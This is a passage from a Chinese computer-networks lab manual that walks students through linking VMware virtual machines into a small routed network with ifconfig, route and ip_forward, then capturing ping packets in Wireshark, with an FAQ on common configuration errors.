</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router0
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

<span class="s19">eth0 </span>(<span class="s21">或其它形式的网卡编号</span>)<span class="s19">:</span>
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1 <span class="s21">(同上)</span>:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router1
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

<span class="s19">eth0 </span>(<span class="s21">同上</span>)<span class="s19">:</span>
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

<span class="s19">eth1 </span>(<span class="s21">同上</span>)<span class="s19">:</span>
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC1
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC2
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC3
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC4
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

PC5
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr></table>

### <a name="bookmark3">背景知识</a>

本系列实验选用<span class="s14">Linux </span>操作系统作为主要实验平台。通过虚拟机软件在一台计算机实体

上模拟出一个小型网络环境，完成实验。

1.  Linux

Linux <span class="s13">是由 </span>Linus Torvalds <span class="s13">最初开发的操作系统内部核心程序，即内核（</span>kernel<span class="s13">）的标识。而所有的基于</span>Linux kernel <span class="s13">的类</span>UINX <span class="s13">操作系统也都被称作 </span>Linux<span class="s13">。相较于 </span>Windows <span class="s13">操作系统在图形用户界面上的巨大优势，</span>Linux <span class="s13">操作系统在网络应用上有很好的表现。这也是我们选用 </span>Linux <span class="s13">操作系统作为主要实验平台的原因之一。</span>

2.  Linux <span class="s23">下的常用网络命令有</span>

ifconfig <span class="s13">、</span>ping<span class="s13">、</span>ip<span class="s13">、</span>netstat <span class="s13">、</span>netconfig<span class="s13">、</span>nc<span class="s13">、</span>tcpdump<span class="s13">、</span>telnet<span class="s13">、</span>ftp <span class="s13">、</span>route<span class="s13">、</span>rlogin <span class="s13">、</span>

rcp <span class="s13">等，我们简要介绍其中比较基础的 </span>ifconfig <span class="s13">和 </span>ping <span class="s13">命令。</span>

<span class="s24">ifconfig </span>和 <span class="s14">MS-DOS </span>下的 <span class="s14">ipconfig </span>命令相似，用以显示和设置网络设备。**语 法**：

ifconfig [<span class="s13">网络设备</span>][down up -allmulti -arp -promisc][add&lt;<span class="s13">地址</span>&gt;][del&lt;<span class="s13">地址</span>&gt;][&lt;<span class="s13">硬件地址</span>&gt;]

[media&lt;<span class="s13">网络媒介类型</span>&gt;][mem_start&lt;<span class="s13">内存地址</span>&gt;][metric&lt;<span class="s13">数目</span>&gt;][mtu&lt;<span class="s13">字节</span>&gt;][netmask&lt;<span class="s13">子网掩码</span>&gt;][tunnel&lt;<span class="s13">地址</span>&gt;][-broadcast&lt;<span class="s13">地址</span>&gt;] [-pointopoint&lt;<span class="s13">地址</span>&gt;]

参 数 <span class="s13">：</span>

    <span class="s14">add&lt;</span>地址<span class="s14">&gt; </span>设置网络设备 <span class="s14">IPv6 </span>的 <span class="s14">IP </span>地址。

    <span class="s14">del&lt;</span>地址<span class="s14">&gt; </span>删除网络设备 <span class="s14">IPv6 </span>的 <span class="s14">IP </span>地址。

    <span class="s14">down </span>关闭指定的网络设备。

    <span class="s14">&lt;</span>硬件地址<span class="s14">&gt; </span>设置网络设备的类型与硬件地址。

    <span class="s14">io_addr </span>设置网络设备的 <span class="s14">I/O </span>地址。

    <span class="s14">irq </span>设置网络设备的 <span class="s14">IRQ</span>。

    <span class="s14">media&lt;</span>网络媒介类型<span class="s14">&gt; </span>设置网络设备的媒介类型。

    <span class="s14">mem_start&lt;</span>内存地址<span class="s14">&gt; </span>设置网络设备在主内存所占用的起始地址。

    <span class="s14">metric&lt;</span>数目<span class="s14">&gt; </span>指定在计算数据包的转送次数时，所要加上的数目。

    <span class="s14">mtu&lt;</span>字节<span class="s14">&gt; </span>设置网络设备的 <span class="s14">MTU</span>。

    <span class="s14">netmask&lt;</span>子网掩码<span class="s14">&gt; </span>设置网络设备的子网掩码。

    <span class="s14">tunnel&lt;</span>地址<span class="s14">&gt; </span>建立 <span class="s14">IPv4 </span>与 <span class="s14">IPv6 </span>之间的隧道通信地址。

    <span class="s14">up </span>启动指定的网络设备。

-broadcast&lt;<span class="s13">地址</span>&gt; <span class="s13">将要送往指定地址的数据包当成广播数据包来处理。</span>

-pointopoint&lt;<span class="s13">地址</span>&gt; <span class="s13">与指定地址的网络设备建立直接连线，此模式具有保密功能。</span>

-promisc <span class="s13">关闭或启动指定网络设备的 </span>promiscuous <span class="s13">模式。指定网络设备的 </span>IP <span class="s13">地址。</span>

[<span class="s13">网络设备</span>] <span class="s13">指定网络设备的名称。</span>

<span class="s24">ping </span>命令是一个检查网络联通状况的常用命令，它发送一个回送信号请求给网络主机。**语 法**：

ping [ -d] [ -D ] [ -n ] [ -q ] [ -r] [ -v] [ \ -R ] [ -a addr_family ] [ -c Count ] [ -w timeout ] [ -f | -i \

Wait ] [ -l Preload ] [ -p Pattern ] [ -s PacketSize ] [ -S hostname/IP addr ] \ [ -L ] [ - I a.b.c.d. ] [ -o interface ] [ -T ttl ] Host [ PacketSize ] \ [ Count ]

参 数 <span class="s13">：</span>

-c Count <span class="s13">指定要被发送（或接收）的回送信号请求的数目，由 </span>Count <span class="s13">变量指出。</span>

-w timeout <span class="s13">这个选项仅和 </span>-c <span class="s13">选项一起才能起作用。它使 </span>ping <span class="s13">命令以最长的超时时间去等待应答（发送最后一个信息包后）。</span>

-d <span class="s13">开始套接字级别的调试。</span>

-D <span class="s13">这个选项引起 </span>ICMP ECHO_REPLY <span class="s13">信息包向标准输出的十六进制转储。</span>

-f <span class="s13">指定 </span>flood-ping <span class="s13">选项。</span>-f <span class="s13">标志</span>“<span class="s13">倾倒</span>”<span class="s13">或输出信息包，在它们回来时或每秒 </span>100 <span class="s13">次，选择较快一个。每一次发送 </span>ECHO_REQUEST<span class="s13">， 都打印一个句号， 而每接收到一个</span>

ECHO_REPLY <span class="s13">信号，就打印一个退格。这就提供了一种对多少信息包被丢弃的信息的快速显示。仅仅 </span>root <span class="s13">用户可以使用这个选项。</span>

-I a.b.c.d <span class="s13">指定被 </span>a.b.c.d <span class="s13">标明的接口将被用于向外的 </span>IPv4 <span class="s13">多点广播。</span>-I <span class="s13">标志是大写的 </span>i <span class="s13">。</span>

-o interface <span class="s13">指出 </span>interface <span class="s13">将被用于向外的 </span>IPv6 <span class="s13">多点广播。接口以 </span>“en0”<span class="s13">，</span>“tr0”<span class="s13">等的形式指定。</span>

-i Wait <span class="s13">在每个信息包发送之间等待被 </span>Wait <span class="s13">变量指定的时间（秒数）。缺省值是在每个信息包发送之间等待 </span>1 <span class="s13">秒。这个选项与 </span>-f <span class="s13">标志不兼容。</span>

-L <span class="s13">对多点广播 </span>ping <span class="s13">命令禁用本地回送。</span>

-l Preload <span class="s13">在进入正常行为模式</span>(<span class="s13">每秒 </span>1 <span class="s13">个</span>)<span class="s13">前尽快发送 </span>Preload <span class="s13">变量指定数量的信息包。</span>-l <span class="s13">标志是小写的 </span>L<span class="s13">。</span>

-n <span class="s13">指定仅输出数字。不企图去查寻主机地址的符号名。</span>

-p Pattern <span class="s13">指定用多达 </span>16 <span class="s13">个</span>“<span class="s13">填充</span>”<span class="s13">字节去填充你发送的信息包。这有利于诊断网络上依赖数据的问题。例如，</span>-p ff <span class="s13">全部用 </span>1 <span class="s13">填充信息包。</span>

-q <span class="s13">指定静默输出。除了在启动和结束时显示总结行外什么也不显示。</span>

-r <span class="s13">忽略路由表直接送到连接的网络上的主机上。如果 主机 不在一个直接连接的网络上，</span>ping <span class="s13">命令将产生一个错误消息。这个选项可以被用来通过一个不再有路由经过的接口去 </span>ping <span class="s13">一个本地主机。</span>

-R   <span class="s13">指 定 记 录 路 由 选 项 。 </span>-R   <span class="s13">标 志 包 括  </span>ECHO_REQUEST   <span class="s13">信 息 包 中 的</span>

RECORD_ROUTE <span class="s13">选项，并且显示返回信息包上的路由缓冲。</span>

-a addr_family <span class="s13">映射 </span>ICMP <span class="s13">信息包的目的地址到 </span>IPv6 <span class="s13">格式，如果 </span>addr_family <span class="s13">等于</span>

“inet6”<span class="s13">的话。</span>

-s PacketSize <span class="s13">指定要发送数据的字节数。缺省值是 </span>56<span class="s13">，当和 </span>8 <span class="s13">字节的 </span>ICMP <span class="s13">头数据合并时被转换成 </span>64 <span class="s13">字节的 </span>ICMP <span class="s13">数据。</span>

-S hostname/IP addr <span class="s13">将 </span>IP <span class="s13">地址用作发出的 </span>ping <span class="s13">信息包中的源地址。在具有不止一个</span>

IP <span class="s13">地址的主机上，可以使用 </span>-S <span class="s13">标志来强制源地址为除了软件包在其上发送的接口的 </span>IP<span class="s13">地址外的任何地址。如果 </span>IP <span class="s13">地址不是以下机器接口地址之一，则返回错误并且不进行任何发送。</span>

-T ttl <span class="s13">指定多点广播信息包的生存时间为 </span>ttl <span class="s13">秒。</span>

-v <span class="s13">请求详细输出，其中列出了除回送信号响应外接收到的 </span>ICMP <span class="s13">信息。更多命令信息请各位自行使用 </span>man <span class="s13">命令查询，例：</span>man ip<span class="s13">。</span>

3.  虚拟机

我们采用虚拟机（<span class="s14">Virtual Machine</span>）软件来模拟一个网络环境进行实验，这类软件的主要功能是利用软件来模拟出具有完整硬件系统功能的且运行在隔离环境中的完整计算机系统。这样我们可以在一台物理计算机即宿主机器（<span class="s14">Host Machine</span>）上模拟出一台或多台虚拟的计算机。这些虚拟机能够像真正的计算机那样进行工作，我们可以在其上安装全新的操作系统和应用软件。通过虚拟机软件中的虚连接设备将各个虚拟机连接起来，我们就可以搭建出实验所需的网络环境。

### <a name="bookmark4">实验方法</a>

本实验的主要目的是让学生了解在一个常见的 <span class="s14">UNIX/Linux </span>系统中，熟悉系统最基本的网络工具集合（包括<span class="s14">ifconfig</span>、<span class="s14">route</span>、<span class="s14">wireshark </span>等）的使用，并能够熟练观察和初步分析协议<span class="s14">PDU </span>的内容，为进一步的实验打下基础。

### <a name="bookmark5">部署，操作</a><span class="s26">/</span>设计步骤（虚拟机器的配置）

1.  虚拟机及网络配置

虚拟机软件以<span class="s14">VMWare </span>为例，操作系统选用<span class="s14">Ubuntu 18.04</span>。

    1.  首先按照提示安装<span class="s14">/</span>拷贝多个虚拟机

    除需运行图形界面软件的虚拟机外，其它默认采用字符界面。在字符界面下可以选用普通用户或根用户<span class="s14">(root)</span>登录。用普通用户登录时，命令提示符为<span class="s14">$</span>，在执行需要 <span class="s14">root </span>用户权限的命令时可通过在命令前加 <span class="s14">sudo</span>，或用 <span class="s14">su </span>命令提升为 <span class="s14">root </span>用户完成。用 <span class="s14">root </span>用户登录时，命令提示符变为<span class="s14">#</span>。

    从字符界面启动图形界面时用命令 <span class="s14">startx</span>，为使图形界面运行正常，请先确保虚拟机内存至少达到 <span class="s14">256M</span>。

        2.  连接已安装好的多个虚拟机

    VMWare <span class="s13">提供了十个虚拟交换机 </span>VMnet0—VMnet9<span class="s13">。其中</span>VMnet0<span class="s13">、</span>VMnet1 <span class="s13">和 </span>VMnet8<span class="s13">为专用设备，分别以 </span>default Bridged<span class="s13">、</span>Host-only <span class="s13">和 </span>NAT <span class="s13">三种方式为虚拟机提供宿主机器原网络服务。另外七个虚拟交换机未被定义，可以用它们进行连接，配制虚拟网络。</span>

    如图为虚拟机启动前状态：

    <span>![image](计算机网络实验教材2.03(修订)/Image_002.jpg)</span>

    选择 <span class="s27">Commands </span>条目下 <span class="s27">Edit virtual machine settings </span>选项，即红框中部分。可对虚拟机的虚拟硬件设备进行调配。

    设置界面如下：

    <span>![image](计算机网络实验教材2.03(修订)/Image_003.jpg)</span>

    选择 <span class="s27">Network Adapter</span><span class="s14">,</span>在右侧的选项框中，用 <span class="s27">Custom:Specific virtual network </span>条目设置虚拟机与虚拟交换机的连接。如图虚拟机<span class="s14">U-571 </span>与虚拟交换机<span class="s15">VMnet2 </span>连接。

    <span class="s14">VMWare </span>没有提供虚拟路由，我们需要用虚拟机来模拟出一个路由器，这样用来模拟路由器的虚拟机至少需要两张网卡，同样通过 <span class="s27">Virtual Machine Settings</span>，可以为虚拟机添加多张网卡。选择上图左边框下方的 <span class="s27">Add </span>按钮

    <span>![image](计算机网络实验教材2.03(修订)/Image_004.jpg)</span>

    点选 <span class="s27">Network Adapter</span>

    <span>![image](计算机网络实验教材2.03(修订)/Image_005.jpg)</span>

    同样选择 <span class="s27">Custom:Specific virtual network</span>，这张虚拟网卡与虚拟交换机 <span class="s15">VMnet3 </span>连接。连接一个简单的网络如下图所示时

    <span>![image](计算机网络实验教材2.03(修订)/Image_006.jpg)</span>

    虚拟机的配置图如下：

    <span>![image](计算机网络实验教材2.03(修订)/Image_007.png)</span>	<span>![image](计算机网络实验教材2.03(修订)/Image_008.jpg)</span>
2.  设置 <span class="s22">IP </span>与路由规则

IP <span class="s13">地址是计算机进行网络通讯的基础，每一台联网计算机都至少具有一个 </span>IP <span class="s13">地址。在日常使用中，我们通常能自动获取 </span>IP<span class="s13">，这是由于 </span>DHCP <span class="s13">协议的作用。在本次实验中我们需</span>

要手动为配置好的虚拟网络分配 <span class="s14">IP </span>地址。

首先使用 <span class="s14">ifconfig </span>命令查看网络配置，以虚拟机 <span class="s14">U-571 </span>为例，键入命令

ifconfig -a | less

用<span class="s14">&quot;q&quot;</span>键退出。

<span>![image](计算机网络实验教材2.03(修订)/Image_009.jpg)</span>

此时，虚拟机还没有 <span class="s14">ipv4 </span>地址。

然后再使用 <span class="s14">ifconfig </span>命令分别为两个网络设备 <span class="s14">eth0</span>(以真机为准)、<span class="s14">eth1 </span>设置 <span class="s14">IP</span><span style=" color: #F00;">(设置 </span>

IP <span class="s16">地址时，子网号最好和虚拟交换机</span>VMnet*<span class="s16">保持一致，便于调试)</span><span class="s13">,命令形式如下：</span>

sudo ifconfig eth0 192.168.2.1 netmask 255.255.255.0

配置好后再用 <span class="s14">ifconfig -a </span>查看

<span>![image](计算机网络实验教材2.03(修订)/Image_010.jpg)</span>

<span style=" color: #000;">对于端系统和大多数情况下的路由器还需要设置网关</span>（路由器中也称为转发规则）（由于例子中的拓扑只有一个路由器，因此跨路由器的数据报均由该路由器转发，因此路由器 <span class="s15">U-571 </span>不需要设置转发规则）

以虚拟机 <span class="s14">U-572 </span>为例，设置 <span class="s14">U-571 </span>的 <span class="s14">eth0 </span>为其默认网关<span style=" color: #F00;">（一般情况下，一台主机只有一个默认网关，当终端只有一个网络适配器时，可以用设置默认网关这种操作方式）</span>，使用

route <span class="s13">命令，命令形式如下：</span>

sudo route add default gw 192.168.2.1

用命令 <span class="s14">route </span>查看结果

<span>![image](计算机网络实验教材2.03(修订)/Image_011.jpg)</span>

IP <span class="s13">设置好后，就可以根据 </span>IP <span class="s13">在路由器上设置路由规则。</span><span class="s16">（刚才已经说过，因为拓扑中只有一个路由器，其实添加路由规则是不必要的，但是为了给大家展示命令的使用，下面给出了添加路由规则的命令）。</span>

如为使虚拟机 <span class="s14">U-572 </span>和 <span class="s14">U-573 </span>之间能够进行通讯，在 <span class="s14">U-571 </span>上添加路由规则，命令形如：

sudo ip route add 192.168.2.0/24 via 192.168.2.1 sudo ip route add 192.168.3.0/24 via 192.168.3.1

其中 <span class="s14">ip route add 192.168.2.0/24 via 192.168.2.1 </span>命令添加的规则，告诉路由目的 <span class="s14">IP </span>在

192.168.2.0/24(192.168.2.1~192.168.2.255)<span class="s13">网段内的数据报经由 </span>IP <span class="s13">地址为 </span>192.168.2.1 <span class="s13">的设备</span>

转发出去，即下一跳的 <span class="s14">IP </span>为 <span class="s14">192.168.2.1</span>。而 <span class="s14">192.168.2.0/24 </span>是<span class="s14">Linux </span>中常用的掩码表示方式。

24 <span class="s13">表示掩码字长为 </span>24 <span class="s13">即掩码为 </span>255.255.255.0<span class="s13">，</span>192.168.2 <span class="s13">为网络号，</span>1~254 <span class="s13">为网络中的主机号。此外还有其他形式用于添加路由规则的命令。</span>

当输入上述命令后，<span class="s15">Linux </span>会提示 <span class="s15">file exists </span>的错误信息，说明 <span class="s15">Linux </span>在分配 <span class="s15">IP </span>地址的时候，会默认帮我们生成一部分路由信息，默认生成的一般是正确的，因此可直接执行下一步操作。但是有两个以上的路由器该怎么设置 <span class="s15">IP </span>信息呢？当有超过两个路由器时，添加路由规则的正确与否在于 <span class="s15">via </span>后面的“下一跳”<span class="s15">IP </span>地址，请大家自行理解“下一跳”的含义，探索如何正确设置路由器的路由规则。

最后我们要让虚拟路由允许转发，置虚拟机 <span class="s14">U-571 </span>的 <span class="s14">ip_forward </span>标志为 <span class="s14">1</span>。这里我们需要把<span class="s14">/proc/sys/net/ipv4/</span>目录下的文件 <span class="s14">ip_forward </span>值置为 <span class="s14">1</span>。使用命令 <span class="s14">echo</span>，形如：

echo 1 &gt; /proc/sys/net/ipv4/ip_forward

注意，在执行命令前，请先输入：

sudo su

进入 <span class="s15">root </span>用户，再对 <span class="s15">ip_forward </span>的值进行修改。否则会报“<span class="s15">permission deny</span>”的错误。更改完成后，请输入 <span class="s15">exit </span>返回到普通用户，因为 <span class="s15">root </span>用户权限太高，对 <span class="s15">Linux </span>所有文件拥有修改权限，如果不小心改动了不该更改的文件，会对 <span class="s15">Linux </span>造成不可逆的损害。

最后，如果 <span class="s15">U571</span>、<span class="s15">U572 </span>和 <span class="s15">U573 </span>能够相互<span class="s15">ping </span>通，证明上述实验成功完成。

3.  抓取协议数据单元

在网络配置完成的基础上，使用网络抓包分析工具 <span class="s14">wireshark </span>抓取协议数据单元进行分析。例如在虚拟机 <span class="s14">U-572 </span>上使用 <span class="s14">ping </span>命令测试与虚拟机 <span class="s14">U-573</span>（设其 <span class="s14">ip </span>为 <span class="s14">192.168.3.2</span>）是否连通。使用命令

ping 192.168.3.2

<span style=" color: #000;">在图形界面下使用 </span><span class="s14">wireshark </span><span style=" color: #000;">可以抓取数据包，</span>运行 <span class="s15">wireshark </span>时需要 <span class="s15">sudo </span>权限，否则无法进行数据报的抓取<span style=" color: #000;">。</span>

sudo wireshark

在下图中 <span class="s15">Interface list </span>中选择要监听的设备，单击即开始监听，运行情况如下：

<span>![image](计算机网络实验教材2.03(修订)/Image_012.jpg)</span>

<span>![image](计算机网络实验教材2.03(修订)/Image_013.jpg)</span>

wireshark  <span class="s16">能够深入地解析每个分组。图示中第一个区域是列表框，记录了数据报的基本信息（序号、时间戳、源地址、目的地址、协议、数据报长度、大致信息），第二个区域为协议框，</span>wireshark  <span class="s16">已经帮我们分析好了各个协议并予以显示，在此区域可以看到数据报的字段信息和每个字段的含义，第三个区域为原始框，上面给出了数据报的 </span>16 <span class="s16">进制数据信息和 </span>ASCII  <span class="s16">表示的信息。在列表框中选中一个分组，协议框和原始框中会显示该分组的详细信息。如图：</span>

<span>![image](计算机网络实验教材2.03(修订)/Image_014.jpg)</span>

协议框中显示所选分组的各层协议：物理层帧、以太网帧、<span class="s14">IP </span>协议，<span class="s14">Internet </span>控制报文协议。原始框中则显示分组中包含的数据的每个字节。从中可以观察到原始数据，其中左边显示的是十六进制的数据，右边则是 <span class="s14">ASCII </span>码。在协议框中选中一个条目，在原始框中会标记出对应的原始数据，反之在原始框中选中也一样。<span style=" color: #F00;">因此，我们可以利用 </span><span class="s15">wireshark </span><span style=" color: #F00;">轻松的分析协议的各个字段的含义及属性。</span>

下图为实验任务的参考拓扑：

<span>![image](计算机网络实验教材2.03(修订)/Image_015.jpg)</span>

### <a name="bookmark6">常见问题</a>

**问题 **<span class="s29">1</span>：主机无法<span class="s14">Ping </span>通与其直接相连的虚拟路由器？

**解答**：<span class="s14">a. </span>检查主机和虚拟路由器的网卡 <span class="s14">Network Adapter </span>是否为同一类型的虚拟交换机

<span class="s14">VMnet*</span>（在虚拟机的设置中，网卡顺序和 <span class="s15">ifconfig -a </span>看到的网卡顺序是相同的）<span style=" color: #000;">；</span>

1.  检查主机网关是否为虚拟路由器对应的网卡 <span class="s14">IP </span>地址；

2.  确认 <span class="s14">IP </span>设置无误，注意请先置 <span class="s14">IP </span>再置网关<span style=" color: #F00;">（在设置 </span><span class="s15">IP </span><span style=" color: #F00;">地址时，请确保设置 </span><span class="s15">IP </span><span style=" color: #F00;">的网络适配器的正确性）。</span>

**问题 **<span class="s29">2</span>：主机可以 <span class="s14">ping </span>通网关，但是无法<span class="s14">ping </span>通主机所在局域网外的路由器或主机？**解答**：<span class="s14">a. </span>检查虚拟路由器是否允许转发，确保 <span class="s14">ip_forward </span>为 <span class="s14">1</span>，即允许转发；

1.  检查虚拟路由器转发规则是否正确，确保转发端口（下一跳）和当前主机不在同一个局域网内。

2.  当有一段很长的链路需要进行联通<span class="s14">(ping)</span>测试时，可以采取分段分析的策略，通过分段分析可以准确定位

**问题 **<span class="s30">3</span>：为什么打开 <span class="s15">572-573 </span>或者 <span class="s15">575-578 </span>的时候，需要定位 <span class="s15">571 </span>或者 <span class="s15">574 </span>的虚拟机文件？**解答**：在创建虚拟机的时候，为了节省计算机资源，<span class="s15">572-573</span>、<span class="s15">575-578 </span>均为链接复制，因此在打开时需要定位主文件的位置。（有兴趣的同学可以自己创建多个虚拟机）

**问题 **<span class="s30">4</span>：为什么我设置了 <span class="s15">IP </span>地址，过一会儿之后 <span class="s15">IP </span>地址自动消失了？

**解答**：实验室的图形界面虚拟机默认开启了<span class="s15">DHCP </span>模式，会自动发现并分配 <span class="s15">IP </span>地址，但是局域网内并没有<span class="s15">DHCP </span>服务器，因此该服务启动时，会抵消掉原来设置好的 <span class="s15">IP </span>地址。因此在使用图形界面时，可以先用下述命令：

sudo service network-manager stop

关闭网络服务，再手动设置 <span class="s15">IP </span>地址。

顺便一提，如果你觉得每次开机都要设置 <span class="s15">IP </span>地址很麻烦，可以在<span class="s15">/etc/network/interfaces</span>文件中写入你想设置的 <span class="s15">IP </span>地址。（<span class="s15">/etc/network/interfaces </span>的格式请自行查阅资料）

**问题 **<span class="s30">5</span>：在添加路由规则的时候出现了“<span class="s15">no such process</span>” ，该如何处理？

<span class="s31">解答：</span>1. <span class="s16">当出现该错误时，请输入 </span>ifconfig -a <span class="s16">检测自己设置的 </span>IP <span class="s16">地址是否还存在，如果不存在，请参照问题 </span>4<span class="s16">。</span>

针对下面两种情况，假设添加路由规则的命令为：<span class="s15">ip route add 192.168.a.0/24 via 192.168.c,d</span>

1.  原理上来说，路由规则如果能正确生效，<span class="s15">192.168.c.d </span>必须是该路由器能够“通信”的 <span class="s15">IP</span>地址。在我们实验中，可以理解为 <span class="s15">192.168.c.d </span>和路由器的出端口 <span class="s15">IP </span>地址在同一个子网下，例如，路由器的出端口是 <span class="s15">eth1</span>，<span class="s15">IP </span>地址为 <span class="s15">192.168.3.1</span>，那 <span class="s15">via </span>后面的 <span class="s15">IP </span>地址 <span class="s15">192.168.c.d</span>，必须是 <span class="s15">192.168.3.x </span>和 <span class="s15">eth1 </span>的 <span class="s15">IP </span>地址在同一子网内。如果不在同一子网内，路由器无法正确添加路由规则，因此会报“<span class="s15">no such process</span>”的错误。此情况输入正确的路由规则即可。

2.  假设还是上述路由器，如果添加路由规则时，在 <span class="s15">via </span>后面先添加了自己出端口的 <span class="s15">IP </span>地址， <span class="s15">ip route add 192.168.a.0/24 via 192.168.3.1</span>，那么把这条路由规则删除，再添加相关的路由规则时，比如 <span class="s15">ip route add 192.168.a.0/24 via 192.168.3.2</span>，也会报“<span class="s15">no such process</span>”的错误。如果是这种情况，先利用命令 <span class="s15">ifconfig eth1 down </span>使该网口失效，然后重新设置 <span class="s15">IP </span>地址和路由规则即可。

问题 <span class="s30">6</span>：<span class="s16">为什么 </span><span class="s15">sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward </span><span class="s16">会报错？</span>

<span class="s31">解答：</span>sudo <span class="s16">的作用是将命令以 </span>root <span class="s16">权限执行，仅作用于后面跟的那一条命令。</span>

&gt; file <span class="s16">表示将标准输出重定向到</span>file <span class="s16">文件内，这一步是由</span>shell <span class="s16">来执行的，因此受制于当前</span>shell

的权限。

